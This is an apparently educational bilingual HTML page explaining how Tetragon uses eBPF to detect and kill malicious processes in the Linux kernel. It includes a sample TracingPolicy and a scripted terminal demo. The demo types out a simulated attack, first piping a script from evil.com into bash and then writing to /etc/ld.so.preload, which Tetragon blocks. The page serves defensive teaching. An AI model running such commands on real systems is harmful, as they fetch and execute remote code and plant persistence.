<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cisco Security Insight: Tetragon & eBPF</title>
    <style>
        /* --- Cisco Brand Identity System --- */
        :root {
            /* Primary Colors */
            --cisco-blue: #049FD9;
            --cisco-midnight: #0D274D;
            --cisco-sky: #6ABF4B;
            
            /* Secondary/Support Colors */
            --cisco-slate: #58585B;
            --cisco-light-gray: #F2F2F2;
            --cisco-platinum: #E4E4E4;
            
            /* Functional Colors */
            --cisco-green: #6CC24A;
            --cisco-red: #E2231A;
            --cisco-orange: #F58025;
            
            /* UI Elements */
            --white: #FFFFFF;
            --shadow-card: 0 8px 24px rgba(13, 39, 77, 0.08);
            --shadow-hover: 0 12px 32px rgba(13, 39, 77, 0.15);
            --radius-sm: 4px;
            --radius-md: 8px;
            --radius-lg: 16px;
        }

        /* --- Typography & Base --- */
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
        
        body {
            font-family: "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: var(--cisco-slate);
            background-color: #FAFAFA;
            line-height: 1.6;
        }

        h1, h2, h3, h4 { color: var(--cisco-midnight); font-weight: 700; letter-spacing: -0.5px; }
        p { margin-bottom: 1.2rem; font-size: 1.05rem; }
        
        /* --- Language Toggling System --- */
        /* Default shows ZH, hides EN. Logic handled by body class */
        body.lang-zh .lang-en { display: none !important; }
        body.lang-en .lang-zh { display: none !important; }

        .lang-switch {
            position: absolute;
            top: 20px;
            right: 20px;
            z-index: 100;
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 20px;
            padding: 4px;
            display: flex;
            backdrop-filter: blur(4px);
        }

        .lang-btn {
            background: transparent;
            border: none;
            color: rgba(255, 255, 255, 0.7);
            padding: 6px 16px;
            border-radius: 16px;
            font-size: 0.85rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .lang-btn.active {
            background: white;
            color: var(--cisco-midnight);
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }

        /* --- Layout --- */
        .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
        section { padding: 80px 0; border-bottom: 1px solid var(--cisco-platinum); background: var(--white); }
        section:nth-child(even) { background: #F9FAFB; }

        /* --- Header / Hero --- */
        header {
            background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
            color: white;
            padding: 100px 0 80px;
            position: relative;
            clip-path: polygon(0 0, 100% 0, 100% 90%, 0 100%);
        }

        .hero-tag {
            background: rgba(255,255,255,0.1);
            color: #61C6E2;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: inline-block;
            margin-bottom: 24px;
            border: 1px solid rgba(4, 159, 217, 0.3);
        }

        h1 { color: white; font-size: 3rem; margin-bottom: 20px; line-height: 1.1; }
        .hero-sub { font-size: 1.25rem; color: rgba(255,255,255,0.85); max-width: 700px; margin-bottom: 40px; }

        /* --- Buttons --- */
        .btn-group { display: flex; gap: 16px; flex-wrap: wrap; }
        .btn {
            display: inline-flex; align-items: center; justify-content: center;
            padding: 14px 32px; border-radius: 30px; font-weight: 600;
            cursor: pointer; transition: all 0.2s ease; border: none; font-size: 1rem;
        }
        .btn-primary { background: var(--cisco-blue); color: white; box-shadow: 0 4px 12px rgba(4, 159, 217, 0.3); }
        .btn-primary:hover { background: #0087BF; transform: translateY(-2px); }
        .btn-outline { background: transparent; border: 2px solid rgba(255,255,255,0.3); color: white; }
        .btn-outline:hover { border-color: white; background: rgba(255,255,255,0.1); }

        /* --- Section Titles --- */
        .section-header { text-align: center; max-width: 800px; margin: 0 auto 60px; }
        .section-header h2 { font-size: 2.25rem; margin-bottom: 16px; position: relative; display: inline-block; }
        .section-header h2::after {
            content: ''; display: block; width: 60px; height: 4px; background: var(--cisco-blue);
            margin: 12px auto 0; border-radius: 2px;
        }
        .section-header p { color: #666; font-size: 1.1rem; }

        /* --- Cards --- */
        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 32px; }
        .card {
            background: white; padding: 40px 32px; border-radius: var(--radius-lg);
            box-shadow: var(--shadow-card); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            border-top: 4px solid transparent; height: 100%;
        }
        .card:hover { transform: translateY(-8px); box-shadow: var(--shadow-hover); border-top-color: var(--cisco-blue); }
        .icon-box {
            width: 64px; height: 64px; background: rgba(4, 159, 217, 0.08); border-radius: 16px;
            display: flex; align-items: center; justify-content: center; margin-bottom: 24px;
        }
        .icon-box svg { stroke: var(--cisco-blue); }

        /* --- Comparison Chart (SVG Wrapper) --- */
        .chart-container {
            background: white; padding: 40px; border-radius: var(--radius-lg);
            box-shadow: var(--shadow-card); margin-top: 40px;
        }

        /* --- Code Snippet --- */
        .code-block {
            background: #1E1E1E; border-radius: var(--radius-md); padding: 24px;
            font-family: 'Consolas', 'Monaco', monospace; font-size: 0.9rem; color: #D4D4D4;
            border-left: 4px solid var(--cisco-green); overflow-x: auto;
        }
        .code-keyword { color: #569CD6; }
        .code-string { color: #CE9178; }
        .code-comment { color: #6A9955; }

        /* --- Terminal --- */
        .terminal {
            background: #111; border-radius: var(--radius-md); overflow: hidden;
            font-family: 'Courier New', monospace; box-shadow: 0 20px 50px rgba(0,0,0,0.3);
        }
        .terminal-bar { background: #333; padding: 12px; display: flex; gap: 8px; }
        .traffic-light { width: 12px; height: 12px; border-radius: 50%; }
        .terminal-content { padding: 24px; min-height: 300px; color: #EEE; }
        .prompt { color: var(--cisco-green); font-weight: bold; }
        .cmd-text { color: white; }
        .output-text { color: #AAA; display: block; margin-bottom: 8px; }
        .alert-text { color: var(--cisco-red); font-weight: bold; background: rgba(226, 35, 26, 0.1); padding: 2px 6px; display: inline-block; border-radius: 4px; }
        .cursor { display: inline-block; width: 10px; height: 18px; background: #CCC; animation: blink 1s infinite; vertical-align: middle;}
        @keyframes blink { 50% { opacity: 0; } }

        /* --- Tabs --- */
        .tabs-nav { display: flex; justify-content: center; gap: 10px; margin-bottom: 40px; }
        .tab-btn {
            background: transparent; border: 2px solid #E0E0E0; padding: 10px 24px;
            border-radius: 24px; font-weight: 600; color: var(--cisco-slate); cursor: pointer;
            transition: all 0.2s;
        }
        .tab-btn.active { background: var(--cisco-blue); border-color: var(--cisco-blue); color: white; }
        .tab-pane { display: none; animation: fadeIn 0.4s ease; }
        .tab-pane.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* --- Responsive --- */
        @media (max-width: 768px) {
            h1 { font-size: 2.2rem; }
            section { padding: 50px 0; }
            .grid-3 { grid-template-columns: 1fr; }
            .terminal-content { font-size: 0.85rem; padding: 16px; }
        }
    </style>
</head>
<body class="lang-zh">

    <!-- Hero Section -->
    <header>
        <div class="lang-switch">
            <button class="lang-btn active" onclick="setLanguage('zh')">中文</button>
            <button class="lang-btn" onclick="setLanguage('en')">EN</button>
        </div>
        <div class="container">
            <div class="hero-tag">Cisco Technology Radar: eBPF</div>
            <h1>
                <span class="lang-zh">Tetragon:<br>云原生安全的最后一道防线</span>
                <span class="lang-en">Tetragon:<br>The Final Line of Defense for<br>Cloud-Native Security</span>
            </h1>
            <p class="hero-sub">
                <span class="lang-zh">在现代化的 IT 架构中，外围防火墙已不足以应对威胁。Tetragon 利用 eBPF 技术，将安全防御下沉至 Linux 内核最深处，实现真正的实时阻断。</span>
                <span class="lang-en">In modern IT architectures, perimeter firewalls are no longer enough. Tetragon utilizes eBPF technology to embed security deep into the Linux kernel for true real-time enforcement.</span>
            </p>
            <div class="btn-group">
                <button class="btn btn-primary" onclick="scrollToId('demo')">
                    <span class="lang-zh">启动攻防演练</span>
                    <span class="lang-en">Start Simulation</span>
                </button>
                <button class="btn btn-outline" onclick="scrollToId('how-it-works')">
                    <span class="lang-zh">查看技术原理</span>
                    <span class="lang-en">How it Works</span>
                </button>
            </div>
        </div>
    </header>

    <!-- Analogy & Core Value -->
    <section id="why-tetragon">
        <div class="container">
            <div class="section-header">
                <h2>
                    <span class="lang-zh">从“安检员”到“免疫系统”</span>
                    <span class="lang-en">From "Security Guard" to "Immune System"</span>
                </h2>
                <p>
                    <span class="lang-zh">为了让不同背景的利益相关者达成共识，我们提供两种视角的解读。</span>
                    <span class="lang-en">To establish common ground for different stakeholders, we offer two perspectives.</span>
                </p>
            </div>

            <div class="tabs-nav">
                <button class="tab-btn active" onclick="switchTab('analogy')">
                    <span class="lang-zh">业务视角 (类比)</span>
                    <span class="lang-en">Analogy (Business)</span>
                </button>
                <button class="tab-btn" onclick="switchTab('technical')">
                    <span class="lang-zh">架构视角 (技术)</span>
                    <span class="lang-en">Technical (Architecture)</span>
                </button>
            </div>

            <!-- Tab 1: Analogy -->
            <div id="analogy" class="tab-pane active">
                <div class="grid-3">
                    <div class="card">
                        <div class="icon-box">
                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M3 11l18-5v12l-18-5z"/></svg>
                        </div>
                        <h3>
                            <span class="lang-zh">传统安全：摄像头</span>
                            <span class="lang-en">Traditional: CCTV Camera</span>
                        </h3>
                        <p>
                            <span class="lang-zh">以前的安全工具（如日志分析）就像是摄像头。它能录下小偷行窃的过程，但当你发现录像时，小偷早就跑了，财产也损失了。这是<b>“异步检测”</b>。</span>
                            <span class="lang-en">Legacy tools (like log analysis) are like CCTV cameras. They record the thief stealing, but by the time you check the footage, the thief—and your data—are gone. This is <b>"Asynchronous Detection"</b>.</span>
                        </p>
                    </div>
                    <div class="card">
                        <div class="icon-box">
                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                        </div>
                        <h3>
                            <span class="lang-zh">Sidecar 模式：安检门</span>
                            <span class="lang-en">Sidecar: Security Checkpoint</span>
                        </h3>
                        <p>
                            <span class="lang-zh">Sidecar 代理就像在每个房间门口设安检。虽然能阻拦，但每个人进出都要排队，导致大楼（服务器）拥堵，性能下降，且容易被绕过。</span>
                            <span class="lang-en">Sidecar proxies are like airport security at every single door. They block threats but create massive queues (latency), slow down the building (server), and can be bypassed.</span>
                        </p>
                    </div>
                    <div class="card">
                        <div class="icon-box">
                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                        </div>
                        <h3>
                            <span class="lang-zh">Tetragon：智能免疫</span>
                            <span class="lang-en">Tetragon: Immune System</span>
                        </h3>
                        <p>
                            <span class="lang-zh">Tetragon 就像人体免疫细胞，直接驻扎在血液（内核）中。只要识别到病毒（恶意进程），无需等待大脑指令，直接吞噬（Kill）病毒。这是<b>“同步阻断”</b>。</span>
                            <span class="lang-en">Tetragon acts like white blood cells living in the bloodstream (Kernel). Upon detecting a virus (malware), it instantly neutralizes (Kills) it without waiting for brain instructions. This is <b>"Synchronous Enforcement"</b>.</span>
                        </p>
                    </div>
                </div>
            </div>

            <!-- Tab 2: Technical -->
            <div id="technical" class="tab-pane">
                <div class="grid-3">
                    <div class="card">
                        <h3>
                            <span class="lang-zh">内核级可观测性</span>
                            <span class="lang-en">Kernel-Level Observability</span>
                        </h3>
                        <p>
                            <span class="lang-zh">利用 eBPF (Extended Berkeley Packet Filter)，Tetragon 能够在不修改内核源码、不加载内核模块的情况下，安全地动态追踪内核函数（kprobes, tracepoints）。</span>
                            <span class="lang-en">Using eBPF, Tetragon safely and dynamically traces kernel functions (kprobes, tracepoints) without modifying kernel source code or loading risky kernel modules.</span>
                        </p>
                    </div>
                    <div class="card">
                        <h3>
                            <span class="lang-zh">零开销数据上下文</span>
                            <span class="lang-en">Zero-Overhead Context</span>
                        </h3>
                        <p>
                            <span class="lang-zh">传统 eBPF 工具只输出 PID/IP。Tetragon 维护了一个内核内的状态表，能够即时将底层的系统调用映射到 Kubernetes 的 Pod, Namespace, Service 等高层元数据。</span>
                            <span class="lang-en">Standard eBPF tools only see PIDs/IPs. Tetragon maintains in-kernel state tables to instantly map low-level syscalls to Kubernetes metadata like Pods, Namespaces, and Services.</span>
                        </p>
                    </div>
                    <div class="card">
                        <h3>
                            <span class="lang-zh">In-Kernel Enforcement</span>
                            <span class="lang-en">In-Kernel Enforcement</span>
                        </h3>
                        <p>
                            <span class="lang-zh">Tetragon 的独特之处在于它不仅仅是“观察者”。它使用 bpf_send_signal 辅助函数，在恶意 syscall 完成之前，直接在内核态终止进程，杜绝了 TOCTOU 攻击。</span>
                            <span class="lang-en">Tetragon isn't just an observer. It uses the `bpf_send_signal` helper to kill processes directly from kernel space *before* the malicious syscall completes, eliminating TOCTOU attacks.</span>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Architecture Visual -->
    <section id="how-it-works" style="background: #F9FBFD;">
        <div class="container">
            <div class="section-header">
                <h2>
                    <span class="lang-zh">工作原理可视化</span>
                    <span class="lang-en">How It Works: Visualization</span>
                </h2>
                <p>
                    <span class="lang-zh">Tetragon 如何在内核层拦截一次恶意的文件写入请求。</span>
                    <span class="lang-en">How Tetragon intercepts a malicious file write request at the kernel layer.</span>
                </p>
            </div>
            
            <div style="background: white; padding: 40px; border-radius: 16px; box-shadow: var(--shadow-card); display: flex; flex-direction: column; align-items: center;">
                <!-- SVG Architecture Diagram -->
                <svg width="100%" height="350" viewBox="0 0 800 350" xmlns="http://www.w3.org/2000/svg">
                    <!-- Definitions -->
                    <defs>
                        <marker id="arrow-blue" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
                            <path d="M0,0 L0,6 L9,3 z" fill="#049FD9" />
                        </marker>
                         <marker id="arrow-red" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
                            <path d="M0,0 L0,6 L9,3 z" fill="#E2231A" />
                        </marker>
                    </defs>

                    <!-- User Space -->
                    <rect x="50" y="20" width="700" height="100" rx="8" fill="#F0F8FC" stroke="#049FD9" stroke-width="2" stroke-dasharray="5,5"/>
                    <text class="lang-zh" x="60" y="50" font-weight="bold" fill="#0D274D">User Space (用户空间)</text>
                    <text class="lang-en" x="60" y="50" font-weight="bold" fill="#0D274D" style="display:none">User Space</text>
                    
                    <!-- App Node -->
                    <circle cx="200" cy="70" r="30" fill="white" stroke="#049FD9" stroke-width="2"/>
                    <text x="200" y="75" text-anchor="middle" font-size="12" fill="#049FD9">App</text>
                    
                    <!-- Kernel Space -->
                    <rect x="50" y="160" width="700" height="160" rx="8" fill="#0D274D" />
                    <text class="lang-zh" x="60" y="190" font-weight="bold" fill="white">Kernel Space (内核空间)</text>
                    <text class="lang-en" x="60" y="190" font-weight="bold" fill="white" style="display:none">Kernel Space</text>

                    <!-- Syscall Flow -->
                    <line x1="200" y1="100" x2="200" y2="200" stroke="#049FD9" stroke-width="3" marker-end="url(#arrow-blue)"/>
                    <text x="210" y="140" fill="#58585B" font-size="12">1. Syscall (write)</text>

                    <!-- eBPF Hook -->
                    <rect x="150" y="200" width="100" height="80" rx="4" fill="#005073" stroke="#6CC24A" stroke-width="2"/>
                    <text x="200" y="230" text-anchor="middle" fill="white" font-weight="bold">eBPF Hook</text>
                    <text x="200" y="250" text-anchor="middle" fill="#6CC24A" font-size="12">kprobe/sys_write</text>

                    <!-- Policy Check -->
                    <line x1="250" y1="240" x2="350" y2="240" stroke="#6CC24A" stroke-width="2" stroke-dasharray="4"/>
                    
                    <rect x="350" y="210" width="180" height="60" rx="4" fill="#6CC24A"/>
                    <text x="440" y="235" text-anchor="middle" fill="#0D274D" font-weight="bold">Tetragon Map</text>
                    <text class="lang-zh" x="440" y="255" text-anchor="middle" fill="#0D274D" font-size="12">安全策略检查</text>
                    <text class="lang-en" x="440" y="255" text-anchor="middle" fill="#0D274D" font-size="12" style="display:none">Policy Check</text>

                    <!-- Block Action -->
                    <line x1="530" y1="240" x2="600" y2="240" stroke="white" stroke-width="2"/>
                    
                    <rect x="600" y="210" width="100" height="60" rx="4" fill="#E2231A"/>
                    <text x="650" y="235" text-anchor="middle" fill="white" font-weight="bold">SIGKILL</text>
                    <text x="650" y="255" text-anchor="middle" fill="white" font-size="11">Signal -9</text>

                    <!-- Return to User Space -->
                    <path d="M 650 210 Q 650 120 240 70" fill="none" stroke="#E2231A" stroke-width="2" marker-end="url(#arrow-red)"/>
                    <text class="lang-zh" x="500" y="100" fill="#E2231A" font-weight="bold">2. 进程被杀 (Killed)</text>
                    <text class="lang-en" x="500" y="100" fill="#E2231A" font-weight="bold" style="display:none">2. Process Killed</text>
                </svg>
            </div>
        </div>
    </section>

    <!-- Performance Section -->
    <section>
        <div class="container">
            <div class="section-header">
                <h2>
                    <span class="lang-zh">为什么 eBPF 更快？</span>
                    <span class="lang-en">Why is eBPF Faster?</span>
                </h2>
                <p>
                    <span class="lang-zh">在关键任务系统中，安全不能以牺牲性能为代价。</span>
                    <span class="lang-en">In mission-critical systems, security cannot come at the cost of performance.</span>
                </p>
            </div>
            
            <div style="display: flex; flex-wrap: wrap; gap: 40px; align-items: center;">
                <div style="flex: 1; min-width: 300px;">
                    <h3>
                        <span class="lang-zh">上下文切换 (Context Switching) 的代价</span>
                        <span class="lang-en">The Cost of Context Switching</span>
                    </h3>
                    <p>
                        <span class="lang-zh">传统工具（如 ptrace 或用户态代理）需要在<b>用户空间</b>和<b>内核空间</b>之间反复复制数据。这就像每次寄信都要亲自跑去邮局。</span>
                        <span class="lang-en">Traditional tools (like ptrace or user-space agents) must constantly copy data between <b>User Space</b> and <b>Kernel Space</b>. This is like driving to the post office for every single letter.</span>
                    </p>
                    <p>
                        <span class="lang-zh">Tetragon 运行在内核中，数据处理就像在自家客厅完成，无需出门。这使得性能损耗从典型的 15%-20% 降低到了 <b>< 1%</b>。</span>
                        <span class="lang-en">Tetragon runs inside the kernel. Data processing happens right in your living room—no travel needed. This drops performance overhead from 15-20% down to <b>< 1%</b>.</span>
                    </p>
                </div>
                
                <!-- Performance Chart SVG -->
                <div style="flex: 1; min-width: 300px; background: white; padding: 20px; border-radius: 12px; box-shadow: var(--shadow-card);">
                    <svg width="100%" height="250" viewBox="0 0 500 250">
                        <!-- Axes -->
                        <line x1="50" y1="200" x2="450" y2="200" stroke="#CCC" stroke-width="2"/>
                        <line x1="50" y1="200" x2="50" y2="20" stroke="#CCC" stroke-width="2"/>
                        
                        <!-- Labels -->
                        <text x="20" y="110" transform="rotate(-90, 20, 110)" font-size="12" fill="#555">CPU Overhead</text>
                        
                        <!-- Bar 1: Ptrace -->
                        <rect x="100" y="50" width="80" height="150" fill="#F58025" opacity="0.8"/>
                        <text x="140" y="45" text-anchor="middle" font-weight="bold" fill="#F58025">High</text>
                        <text x="140" y="220" text-anchor="middle" fill="#555">Ptrace/Auditd</text>

                        <!-- Bar 2: eBPF -->
                        <rect x="280" y="180" width="80" height="20" fill="#049FD9"/>
                        <text x="320" y="175" text-anchor="middle" font-weight="bold" fill="#049FD9">Low (<1%)</text>
                        <text x="320" y="220" text-anchor="middle" fill="#555">Tetragon (eBPF)</text>
                    </svg>
                </div>
            </div>
        </div>
    </section>

    <!-- Use Cases -->
    <section style="background: #F9FBFD;">
        <div class="container">
            <div class="section-header">
                <h2>
                    <span class="lang-zh">三大核心防御场景</span>
                    <span class="lang-en">Three Core Defense Scenarios</span>
                </h2>
            </div>
            <div class="grid-3">
                <div class="card" style="border-top-color: var(--cisco-red);">
                    <h4>
                        <span class="lang-zh">1. 敏感文件防篡改</span>
                        <span class="lang-en">1. File Integrity Monitoring</span>
                    </h4>
                    <p style="font-size: 0.9rem; margin-top: 10px;">
                        <span class="lang-zh"><b>威胁：</b> 攻击者修改 <code>/etc/passwd</code> 或 <code>/etc/ld.so.preload</code> 以实现持久化驻留。</span>
                        <span class="lang-en"><b>Threat:</b> Attackers modifying <code>/etc/passwd</code> or <code>/etc/ld.so.preload</code> for persistence.</span>
                    </p>
                    <p style="font-size: 0.9rem;">
                        <span class="lang-zh"><b>对策：</b> 配置 Tetragon 监控特定路径的 <code>write</code> 系统调用，一旦触发立即 Kill。</span>
                        <span class="lang-en"><b>Action:</b> Tetragon monitors `write` syscalls on sensitive paths and kills the process instantly on trigger.</span>
                    </p>
                </div>
                <div class="card" style="border-top-color: var(--cisco-orange);">
                    <h4>
                        <span class="lang-zh">2. 反弹 Shell 阻断</span>
                        <span class="lang-en">2. Reverse Shell Blocking</span>
                    </h4>
                    <p style="font-size: 0.9rem; margin-top: 10px;">
                        <span class="lang-zh"><b>威胁：</b> 应用漏洞导致黑客启动了一个连接到外部 C2 服务器的 Shell。</span>
                        <span class="lang-en"><b>Threat:</b> App vulnerability allowing hackers to spawn a shell connected to a C2 server.</span>
                    </p>
                    <p style="font-size: 0.9rem;">
                        <span class="lang-zh"><b>对策：</b> 监控 <code>connect</code> 和 <code>execve</code>，如果进程不是预期的二进制文件，禁止网络连接。</span>
                        <span class="lang-en"><b>Action:</b> Monitor `connect` & `execve`. If the process isn't an approved binary, block the network.</span>
                    </p>
                </div>
                <div class="card" style="border-top-color: var(--cisco-green);">
                    <h4>
                        <span class="lang-zh">3. 容器逃逸防御</span>
                        <span class="lang-en">3. Container Escape Prevention</span>
                    </h4>
                    <p style="font-size: 0.9rem; margin-top: 10px;">
                        <span class="lang-zh"><b>威胁：</b> 特权容器试图挂载宿主机文件系统或访问 Namespace 之外的资源。</span>
                        <span class="lang-en"><b>Threat:</b> Privileged containers attempting to mount host filesystems or access outside Namespace.</span>
                    </p>
                    <p style="font-size: 0.9rem;">
                        <span class="lang-zh"><b>对策：</b> 强制执行 Namespace 隔离策略，禁止非法的 Capability 提权。</span>
                        <span class="lang-en"><b>Action:</b> Enforce strict Namespace isolation and deny illegal Capability escalation.</span>
                    </p>
                </div>
            </div>
        </div>
    </section>

    <!-- Configuration Demo -->
    <section>
        <div class="container">
            <div class="section-header">
                <h2>
                    <span class="lang-zh">策略即代码 (Policy as Code)</span>
                    <span class="lang-en">Policy as Code</span>
                </h2>
                <p>
                    <span class="lang-zh">Tetragon 使用 Kubernetes CRD (Custom Resource Definitions) 进行管理，简单易读。</span>
                    <span class="lang-en">Tetragon uses Kubernetes CRD (Custom Resource Definitions), making it simple and readable.</span>
                </p>
            </div>
            
            <div class="code-block">
                <div>
                    <span class="code-comment lang-zh"># 示例：禁止任何非 Root 用户读取 /etc/shadow</span>
                    <span class="code-comment lang-en" style="display:none"># Example: Deny non-root read of /etc/shadow</span>
                </div>
                <div><span class="code-keyword">apiVersion</span>: cilium.io/v1alpha1</div>
                <div><span class="code-keyword">kind</span>: TracingPolicy</div>
                <div><span class="code-keyword">metadata</span>:</div>
                <div>&nbsp;&nbsp;<span class="code-keyword">name</span>: <span class="code-string">"deny-shadow-read"</span></div>
                <div><span class="code-keyword">spec</span>:</div>
                <div>&nbsp;&nbsp;<span class="code-keyword">kprobes</span>:</div>
                <div>&nbsp;&nbsp;- <span class="code-keyword">call</span>: <span class="code-string">"sys_openat"</span> <span class="code-comment"># Hook Point</span></div>
                <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">syscall</span>: <span class="code-string">true</span></div>
                <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">args</span>:</div>
                <div>&nbsp;&nbsp;&nbsp;&nbsp;- <span class="code-keyword">index</span>: 1</div>
                <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">type</span>: <span class="code-string">"string"</span></div>
                <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">operator</span>: <span class="code-string">"Equal"</span></div>
                <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">values</span>: [<span class="code-string">"/etc/shadow"</span>] <span class="code-comment"># Target File</span></div>
                <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">selectors</span>:</div>
                <div>&nbsp;&nbsp;&nbsp;&nbsp;- <span class="code-keyword">matchActions</span>:</div>
                <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- <span class="code-keyword">action</span>: <span class="code-string">"Sigkill"</span> 
                    <span class="code-comment lang-zh"># 执行动作：杀无赦</span>
                    <span class="code-comment lang-en" style="display:none"># Action: Terminate immediately</span>
                </div>
            </div>
        </div>
    </section>

    <!-- Interactive Demo -->
    <section id="demo" style="background: #111; color: white;">
        <div class="container">
            <div class="section-header">
                <h2 style="color: white;">
                    <span class="lang-zh">实时攻防演练</span>
                    <span class="lang-en">Real-Time Attack Simulation</span>
                </h2>
                <p style="color: #aaa;">
                    <span class="lang-zh">请尝试以攻击者的身份操作系统。注意观察 eBPF 的响应速度。</span>
                    <span class="lang-en">Try operating as an attacker. Notice the speed of the eBPF response.</span>
                </p>
            </div>

            <div style="display: flex; justify-content: center; gap: 20px; margin-bottom: 20px;">
                <button class="btn btn-primary" onclick="runAttackSequence()" id="attackBtn">
                    <span class="lang-zh">执行 Rootkit 安装</span>
                    <span class="lang-en">Execute Rootkit Install</span>
                </button>
                <button class="btn btn-outline" onclick="resetTerminal()">
                    <span class="lang-zh">重置终端</span>
                    <span class="lang-en">Reset Terminal</span>
                </button>
            </div>

            <div class="terminal">
                <div class="terminal-bar">
                    <div class="traffic-light red" style="background: #ff5f56;"></div>
                    <div class="traffic-light yellow" style="background: #ffbd2e;"></div>
                    <div class="traffic-light green" style="background: #27c93f;"></div>
                    <span style="margin-left: 10px; color: #999; font-size: 0.8rem;">ssh root@production-db-01</span>
                </div>
                <div class="terminal-content" id="termOutput">
                    <div class="output-text">Last login: Today from 192.168.1.5</div>
                    <div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>
                </div>
            </div>
        </div>
    </section>

    <footer>
        <div class="container" style="text-align: center; color: #999; font-size: 0.9rem;">
            <p>&copy; 2025 Security Architecture Reference. Powered by eBPF & Tetragon.</p>
            <p>Designed with Cisco Visual Identity for Educational Purposes.</p>
        </div>
    </footer>

    <script>
        // Global State
        let currentLang = 'zh';

        // Language Switcher Logic
        function setLanguage(lang) {
            currentLang = lang;
            document.body.className = 'lang-' + lang;
            
            // Update Toggle Buttons
            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelector(`.lang-btn[onclick="setLanguage('${lang}')"]`).classList.add('active');

            // Update SVG Text elements manually (CSS can't always handle SVG inner elements reliably across browsers)
            const zhSvg = document.querySelectorAll('svg .lang-zh');
            const enSvg = document.querySelectorAll('svg .lang-en');
            
            if (lang === 'zh') {
                zhSvg.forEach(el => el.style.display = 'block');
                enSvg.forEach(el => el.style.display = 'none');
            } else {
                zhSvg.forEach(el => el.style.display = 'none');
                enSvg.forEach(el => el.style.display = 'block');
            }
        }

        // Smooth scroll
        function scrollToId(id) {
            document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
        }

        // Tab Switcher
        function switchTab(tabId) {
            document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
        }

        // Terminal Logic
        const termContent = document.getElementById('termOutput');
        let isAttacking = false;

        function resetTerminal() {
            termContent.innerHTML = `
                <div class="output-text">Last login: Today from 192.168.1.5</div>
                <div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>
            `;
            isAttacking = false;
            document.getElementById('attackBtn').style.opacity = '1';
            document.getElementById('attackBtn').disabled = false;
        }

        async function typeWriter(text, element) {
            for (let char of text) {
                element.innerHTML += char;
                await new Promise(r => setTimeout(r, 40)); // Typing speed
            }
        }

        async function runAttackSequence() {
            if (isAttacking) return;
            isAttacking = true;
            document.getElementById('attackBtn').style.opacity = '0.5';
            document.getElementById('attackBtn').disabled = true;

            // Remove existing cursor
            const cursors = document.querySelectorAll('.cursor');
            cursors.forEach(c => c.style.display = 'none');

            // Line 1: Download malware
            let line1 = document.createElement('div');
            line1.innerHTML = '<span class="prompt">root@prod-db:~#</span> <span class="cmd-text"></span>';
            termContent.appendChild(line1);
            let cmd1 = line1.querySelector('.cmd-text');
            
            await typeWriter('curl -fsSL http://evil.com/setup.sh | bash', cmd1);
            await new Promise(r => setTimeout(r, 600));

            const connectingText = currentLang === 'zh' ? '> 正在连接 evil.com...' : '> Connecting to evil.com...';
            termContent.innerHTML += `<div class="output-text" style="color: #6CC24A;">${connectingText}</div>`;
            await new Promise(r => setTimeout(r, 800));

            // TETRAGON INTERVENTION 1 (Network)
            const warningText = currentLang === 'zh' 
                ? '[Tetragon] ⚠️ 检测到可疑网络连接 (curl -> evil.com:80)'
                : '[Tetragon] ⚠️ Suspicious network connection detected (curl -> evil.com:80)';

            termContent.innerHTML += `
                <div class="output-text" style="color: var(--cisco-orange); border-left: 2px solid var(--cisco-orange); padding-left: 8px;">
                    ${warningText}
                </div>
            `;
            await new Promise(r => setTimeout(r, 500));

            // Line 2: Try to write to sensitive file
            termContent.innerHTML += `<div><span class="prompt">root@prod-db:~#</span> <span class="cmd-text">echo "root_kit" >> /etc/ld.so.preload</span></div>`;
            await new Promise(r => setTimeout(r, 600));

            // TETRAGON INTERVENTION 2 (Block)
            const killText = currentLang === 'zh'
                ? "进程 'bash' (pid=1402) 已被 SIGKILL 终止"
                : "Process 'bash' (pid=1402) killed by SIGKILL";

